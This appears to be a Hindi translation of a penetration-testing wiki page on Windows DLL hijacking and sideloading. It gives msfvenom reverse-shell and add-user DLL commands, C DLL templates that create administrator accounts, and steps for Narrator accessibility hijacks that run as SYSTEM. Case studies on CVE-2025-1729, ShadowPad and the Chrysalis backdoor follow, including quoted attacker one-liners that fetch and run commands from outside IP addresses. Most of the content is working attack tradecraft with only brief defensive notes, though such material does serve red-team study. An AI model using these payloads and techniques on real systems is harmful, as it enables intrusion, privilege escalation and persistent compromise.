[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) tool से आप किसी executable को **निर्दिष्ट करके वह library चुन सकते हैं** जिसे आप proxify करना चाहते हैं, और **proxified dll generate** कर सकते हैं; या **DLL निर्दिष्ट करके** एक **proxified dll generate** कर सकते हैं।

### **Meterpreter**

**Rev shell प्राप्त करें (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**एक meterpreter (x86) प्राप्त करें:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**एक user बनाएं (x86, मुझे x64 version नहीं मिला):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### आपका अपना

कई मामलों में, आपके द्वारा compile की गई DLL को **victim process द्वारा import किए गए हर function को export करना चाहिए**। यदि कोई आवश्यक export मौजूद नहीं है, तो binary उसे resolve नहीं कर सकता और exploit विफल हो जाता है।

<details>
<summary>C DLL template (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>यूज़र निर्माण के साथ C++ DLL उदाहरण</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>थ्रेड एंट्री वाला वैकल्पिक C DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## केस स्टडी: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe अभी भी शुरू होते समय एक अनुमानित, भाषा-विशिष्ट localization DLL को खोजता है, जिसे arbitrary code execution और persistence के लिए hijack किया जा सकता है।<sup>[[7]](#references)</sup>

मुख्य तथ्य
- Probe path (वर्तमान builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US)।
- Legacy path (पुराने builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`।
- यदि OneCore path पर attacker के नियंत्रण वाली writable DLL मौजूद है, तो उसे load किया जाता है और `DllMain(DLL_PROCESS_ATTACH)` execute होता है। किसी export की आवश्यकता नहीं है।

Procmon से खोज
- Filter: `Process Name is Narrator.exe` और `Operation is Load Image` या `CreateFile`।
- Narrator शुरू करें और ऊपर दिए गए path को load करने के प्रयास को देखें।

न्यूनतम DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC में शांत रहना
- एक naive hijack से UI पर बोलना/हाइलाइट करना शुरू हो जाएगा। शांत रहने के लिए, attach होने पर Narrator threads की enumeration करें, main thread खोलें (`OpenThread(THREAD_SUSPEND_RESUME)`) और उसे `SuspendThread` करें; अपने thread में जारी रखें। पूरे code के लिए PoC देखें।<sup>[[8]](#references)</sup>

Accessibility configuration के ज़रिए ट्रिगर और persistence
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- ऊपर दिए गए तरीके से, Narrator शुरू करने पर planted DLL load होती है। Secure desktop (logon screen) पर Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएँ; आपकी DLL secure desktop पर SYSTEM के रूप में execute होगी।

RDP के ज़रिए ट्रिगर किया गया SYSTEM execution (lateral movement)
- Classic RDP security layer की अनुमति दें: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host से RDP करें और logon screen पर Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएँ; आपकी DLL secure desktop पर SYSTEM के रूप में execute होगी।
- RDP session बंद होने पर execution रुक जाता है—तुरंत inject/migrate करें।

Bring Your Own Accessibility (BYOA)
- आप built-in Accessibility Tool (AT) की registry entry (जैसे, CursorIndicator) clone कर सकते हैं, उसे arbitrary binary/DLL की ओर इंगित करने के लिए edit कर सकते हैं, उसे import कर सकते हैं, और फिर `configuration` को उस AT name पर set कर सकते हैं। इससे Accessibility framework के तहत arbitrary execution proxy होता है।

Notes
- `%windir%\System32` में लिखने और HKLM values बदलने के लिए admin rights आवश्यक हैं।
- पूरा payload logic `DLL_PROCESS_ATTACH` में रखा जा सकता है; किसी export की ज़रूरत नहीं है।

## Case Study: CVE-2025-1729 - TPQMAssistant.exe का उपयोग करके Privilege Escalation

यह case Lenovo के TrackPoint Quick Menu (`TPQMAssistant.exe`) में **Phantom DLL Hijacking** दर्शाता है, जिसे **CVE-2025-1729** के रूप में track किया गया है।<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `C:\ProgramData\Lenovo\TPQM\Assistant\` में स्थित `TPQMAssistant.exe`।
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` प्रतिदिन सुबह 9:30 बजे logged-on user के context में चलता है।
- **Directory Permissions**: `CREATOR OWNER` द्वारा writable, जिससे local users arbitrary files डाल सकते हैं।
- **DLL Search Behavior**: पहले अपनी working directory से `hostfxr.dll` load करने की कोशिश करता है और उसके मौजूद न होने पर "NAME NOT FOUND" log करता है, जो local directory search precedence को दर्शाता है।

### Exploit Implementation

एक attacker उसी directory में malicious `hostfxr.dll` stub रख सकता है और इस missing DLL का फायदा उठाकर user के context में code execution हासिल कर सकता है:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Attack Flow

1. Standard user के रूप में, `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में रखें।
2. Scheduled task के मौजूदा user के context में सुबह 9:30 बजे चलने तक प्रतीक्षा करें।
3. यदि task execute होते समय कोई administrator logged in है, तो malicious DLL administrator के session में medium integrity पर चलता है।
4. Medium integrity से SYSTEM privileges तक elevate करने के लिए standard UAC bypass techniques को chain करें।

## Case Study: MSI CustomAction Dropper + Signed Host (wsc_proxy.exe) के ज़रिए DLL Side-Loading

Threat actors अक्सर trusted, signed process के तहत payloads execute करने के लिए MSI-based droppers को DLL side-loading के साथ जोड़ते हैं।<sup>[[10]](#references)</sup>

Chain का अवलोकन
- User MSI डाउनलोड करता है। GUI install के दौरान एक CustomAction चुपचाप चलता है (जैसे, LaunchApplication या VBScript action), जो embedded resources से अगला stage फिर से बनाता है।
- Dropper एक legitimate, signed EXE और एक malicious DLL को एक ही directory में लिखता है (उदाहरण: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll)।
- Signed EXE शुरू होने पर, Windows DLL search order पहले working directory से wsc.dll load करता है, जिससे signed parent के तहत attacker code execute होता है (ATT&CK T1574.001)।

MSI analysis (क्या देखना है)
- CustomAction table:
  - ऐसी entries देखें जो executables या VBScript चलाती हैं। संदिग्ध pattern का उदाहरण: LaunchApplication, जो background में embedded file execute करता है।
  - Orca (Microsoft Orca.exe) में CustomAction, InstallExecuteSequence और Binary tables inspect करें।
- MSI CAB में embedded/split payloads:
  - Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
  - या lessmsi का उपयोग करें: lessmsi x package.msi C:\out
  - कई छोटे fragments देखें, जिन्हें VBScript CustomAction concatenate और decrypt करता है। सामान्य flow:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

wsc_proxy.exe के साथ व्यावहारिक sideloading
- इन दोनों फ़ाइलों को एक ही फ़ोल्डर में रखें:
  - wsc_proxy.exe: वैध, हस्ताक्षरित host (Avast)। यह process अपनी directory से नाम के आधार पर wsc.dll लोड करने का प्रयास करता है।
  - wsc.dll: attacker DLL। यदि किसी खास export की आवश्यकता नहीं है, तो DllMain पर्याप्त हो सकता है; अन्यथा, एक proxy DLL बनाएँ और payload को DllMain में चलाते हुए आवश्यक exports को genuine library तक forward करें।
- एक न्यूनतम DLL payload बनाएँ:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Export requirements के लिए, ऐसा proxying framework (जैसे DLLirant/Spartacus) इस्तेमाल करें जो एक forwarding DLL बनाए और आपका payload भी execute करे।

- यह technique host binary द्वारा DLL name resolution पर निर्भर करती है। अगर host absolute paths या safe loading flags (जैसे LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) का इस्तेमाल करता है, तो hijack विफल हो सकता है।
- चयन के दौरान KnownDLLs, SxS और forwarded exports प्राथमिकता को प्रभावित कर सकते हैं; host binary और export set चुनते समय इन्हें ध्यान में रखें।

## Signed triads + encrypted payloads (ShadowPad का case study)

Check Point ने बताया कि Ink Dragon, legitimate software में घुल-मिलने और core payload को disk पर encrypted रखने के लिए ShadowPad को **three-file triad** के ज़रिए deploy करता है:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – AMD, Realtek या NVIDIA जैसे vendors का दुरुपयोग किया जाता है (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`)। हमलावर executable का नाम बदलकर उसे Windows binary जैसा दिखाते हैं (उदाहरण के लिए `conhost.exe`), लेकिन Authenticode signature मान्य रहती है।
2. **Malicious loader DLL** – EXE के बगल में अपेक्षित नाम के साथ डाली जाती है (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`)। यह DLL आमतौर पर ScatterBrain framework से obfuscated MFC binary होती है; इसका एकमात्र काम encrypted blob को ढूँढ़ना, उसे decrypt करना और ShadowPad को reflectively map करना है।
3. **Encrypted payload blob** – अक्सर उसी directory में `<name>.tmp` के रूप में रखा जाता है। Decrypted payload को memory-map करने के बाद, loader forensic evidence नष्ट करने के लिए TMP file हटा देता है।

Tradecraft notes:

* PE header में मूल `OriginalFileName` रखते हुए signed EXE का नाम बदलने से वह Windows binary का रूप ले सकती है और vendor signature भी बनाए रखती है। इसलिए Ink Dragon की तरह `conhost.exe` जैसी दिखने वाली binaries डालें, जो वास्तव में AMD/NVIDIA utilities हों।
* चूँकि executable trusted रहती है, इसलिए ज़्यादातर allowlisting controls को केवल आपकी malicious DLL का उसके बगल में होना रोकना होता है। Loader DLL को customize करने पर ध्यान दें; आमतौर पर signed parent को बिना बदलाव चलाया जा सकता है।
* ShadowPad के decryptor को TMP blob, loader के बगल में और writable होना चाहिए, ताकि mapping के बाद वह file को zero कर सके। Payload load होने तक directory को writable रखें; memory में आने के बाद OPSEC के लिए TMP file को सुरक्षित रूप से हटाया जा सकता है।

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators, LOLBAS के साथ DLL sideloading का इस्तेमाल करते हैं, ताकि disk पर एकमात्र custom artifact trusted EXE के बगल में रखी malicious DLL हो:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell `cmd.exe /c` चलाता है, Finger server से commands लाता है और उन्हें `cmd` तक pipe करता है:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` TCP/79 text खींचता है; `| cmd` सर्वर के response को execute करता है, जिससे operators server-side पर second stage को बदल सकते हैं।

- **Built-in download/extract:** किसी benign extension वाली archive डाउनलोड करें, उसे unpack करें, और sideload target तथा DLL को किसी random `%LocalAppData%` folder में stage करें:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` progress को छिपाता है और redirects का अनुसरण करता है; `tar -xf` Windows के built-in tar का उपयोग करता है।

- **WMI/CIM launch:** EXE को WMI के ज़रिए शुरू करें, ताकि telemetry में colocated DLL लोड करते समय CIM-created process दिखाई दे:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - उन binaries के साथ काम करता है जो local DLLs को प्राथमिकता देते हैं (जैसे, `intelbq.exe`, `nearby_share.exe`); payload (जैसे, Remcos) trusted name के तहत चलता है।

- **Hunting:** जब `forfiles` में `/p`, `/m`, और `/c` एक साथ दिखाई दें, तो alert करें; admin scripts के बाहर इनका उपयोग असामान्य है।


## केस स्टडी: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

हाल ही में Lotus Blossom intrusion ने trusted update chain का दुरुपयोग करके एक NSIS-packed dropper पहुंचाया, जिसने DLL sideload और पूरी तरह memory में चलने वाले payloads को stage किया।<sup>[[13]](#references)</sup>

तकनीकी कार्यप्रवाह
- `update.exe` (NSIS) `%AppData%\Bluetooth` बनाता है, उसे **HIDDEN** चिह्नित करता है, Bitdefender Submission Wizard के renamed `BluetoothService.exe`, एक malicious `log.dll`, और एक encrypted blob `BluetoothService` को वहां रखता है, फिर EXE लॉन्च करता है।
- Host EXE `log.dll` import करता है और `LogInit`/`LogWrite` को call करता है। `LogInit` blob को mmap-load करता है; `LogWrite` उसे custom LCG-based stream से decrypt करता है (constants **0x19660D** / **0x3C6EF35F**, key material पहले के hash से derive किया जाता है), buffer को plaintext shellcode से overwrite करता है, अस्थायी डेटा free करता है, और उस पर jump करता है।
- IAT से बचने के लिए, loader **FNV-1a basis 0x811C9DC5 + prime 0x1000193** का उपयोग करके export names को hash करता है, फिर Murmur-style avalanche (**0x85EBCA6B**) लागू कर salted target hashes से तुलना करता है।

मुख्य shellcode (Chrysalis)
- पांच passes में key `gQ2JR&9;` पर add/XOR/sub दोहराकर PE-जैसे main module को decrypt करता है, फिर import resolution पूरा करने के लिए `Kernel32.dll` → `GetProcAddress` को dynamically load करता है।
- हर character पर bit-rotate/XOR transforms के जरिए runtime में DLL name strings को फिर से बनाता है, फिर `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` load करता है।
- दूसरा resolver **PEB → InMemoryOrderModuleList** को traverse करता है, हर export table को Murmur-style mixing के साथ 4-byte blocks में parse करता है, और hash न मिलने पर ही `GetProcAddress` का सहारा लेता है।

Embedded configuration और C2
- Config, छोड़ी गई `BluetoothService` file में **offset 0x30808** (size **0x980**) पर मौजूद है और इसे key `qwhvb^435h&*7` से RC4-decrypt करने पर C2 URL और User-Agent मिलता है।
- Beacons एक dot-delimited host profile बनाते हैं, उसके आगे tag `4Q` जोड़ते हैं, फिर HTTPS पर `HttpSendRequestA` से भेजने से पहले key `vAuig34%^325hGV` से RC4-encrypt करते हैं। Responses को RC4-decrypt करके tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases) के जरिए dispatch किया जाता है।
- Execution mode CLI args से नियंत्रित होता है: कोई args न होने पर `-i` की ओर संकेत करने वाली persistence (service/Run key) install होती है; `-i` self को `-k` के साथ फिर से launch करता है; `-k` install को छोड़कर payload चलाता है।

देखा गया alternate loader
- इसी intrusion ने Tiny C Compiler भी छोड़ा और `C:\ProgramData\USOShared\` से `svchost.exe -nostdlib -run conf.c` चलाया, जिसके साथ `libtcc.dll` भी मौजूद था। Attacker द्वारा दिया गया C source shellcode को embed करता था, उसे compile करता था और PE को disk पर लिखे बिना memory में चलाता था। इसे इस तरह दोहराएं:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- इस TCC-based compile-and-run stage ने runtime पर `Wininet.dll` import किया और hardcoded URL से second-stage shellcode प्राप्त किया, जिससे ऐसा flexible loader मिला जो compiler run जैसा दिखता है।

## Export proxying + host thread parking के साथ Signed-host sideloading

कुछ DLL sideloading chains में **stability engineering** जोड़ी जाती है, ताकि legitimate host बाद के stages को बिना crash हुए ठीक से load करने के लिए पर्याप्त समय तक चलता रहे।<sup>[[11]](#references)</sup>

देखा गया pattern
- एक trusted EXE को malicious DLL के साथ, `version.dll` जैसे अपेक्षित dependency name के तहत रखें।
- Malicious DLL हर अपेक्षित export को **real system DLL** (उदाहरण के लिए `%SystemRoot%\\System32\\version.dll`) पर proxy करता है, ताकि import resolution सफल रहे और host process काम करता रहे।
- Load होने के बाद, malicious DLL **host entry point को patch** करता है, ताकि main thread process से बाहर निकलने या उसे terminate करने वाले code paths चलाने के बजाय अनंत `Sleep` loop में चला जाए।
- एक नया thread असली malicious काम करता है: next-stage DLL name या path को decrypt करना (RC4/XOR आम हैं), फिर उसे `LoadLibrary` से launch करना।

यह क्यों मायने रखता है
- सामान्य DLL proxying API compatibility बनाए रखती है, लेकिन यह सुनिश्चित नहीं करती कि बाद के stages के लिए host पर्याप्त समय तक चलता रहे।
- Main thread को `Sleep(INFINITE)` में रोकना, loader द्वारा worker thread में decryption, staging या network bootstrap किए जाने तक signed process को चालू रखने का सरल तरीका है।
- अगर आप केवल संदिग्ध `DllMain` की तलाश करते हैं, तो यह pattern छूट सकता है—क्योंकि दिलचस्प गतिविधि host entry point patch होने और secondary thread शुरू होने के बाद होती है।

न्यूनतम workflow
1. Signed host EXE को copy करें और पता लगाएँ कि वह local directory से कौन-सी DLL resolve करता है।
2. समान functions export करने और उन्हें legitimate DLL पर forward करने वाली proxy DLL बनाएँ।
3. `DllMain(DLL_PROCESS_ATTACH)` में एक worker thread बनाएँ।
4. उस thread से, host entry point या main thread start routine को patch करें, ताकि वह `Sleep` loop में चलता रहे।
5. Next-stage DLL name/config को decrypt करें और `LoadLibrary` call करें या payload को manual-map करें।

Defensive pivots
- ऐसे signed processes जो `version.dll` या इसी तरह की आम libraries को `System32` के बजाय अपनी application directory से load करते हैं।
- Image load होने के तुरंत बाद process entry point पर memory patches, खासकर वे jumps/calls जो `Sleep`/`SleepEx` पर redirect होते हैं।
- Proxy DLL द्वारा बनाए गए ऐसे threads जो decrypted name वाली दूसरी DLL पर तुरंत `LoadLibrary` call करते हैं।
- Writable staging directories जैसे `ProgramData`, `%TEMP%` या unpacked archive paths में vendor executables के बगल में रखी गई full-export proxy DLLs।

## References

- [1] [Red Canary – Intelligence Insights: जनवरी 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe का उपयोग करके Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows में DLL hijacking. सरल C उदाहरण.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore द्वारा Europe को निशाना बनाने वाला नया Malware तैनात करना](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: जब DLL Hijacks का सामना Windows Helpers से होता है](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Gh0st RAT वितरित करने वाले बदलते Impersonation Campaigns की संरचना](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – परस्पर मिलते हित: Southeast Asian Government को निशाना बनाने वाले Threat Clusters का विश्लेषण](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon के भीतर: Stealthy Offensive Operation के Relay Network और आंतरिक कार्यप्रणाली का खुलासा](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom के toolkit का विस्तृत विश्लेषण](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Iranian APT Screening Serpens के 2026 Espionage Campaigns पर नज़र रखना](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Iranian Conflict के दौरान Nimbus Manticore Operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 द्वारा Southeast Asian Governments और Critical Infrastructure को निशाना बनाना](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Microsoft Learn – PE format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [27] [FortiGuard Labs – Legitimate Software में Embedded SectopRAT Variant का पता लगाना](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
{{#include ../../../banners/hacktricks-training.md}}
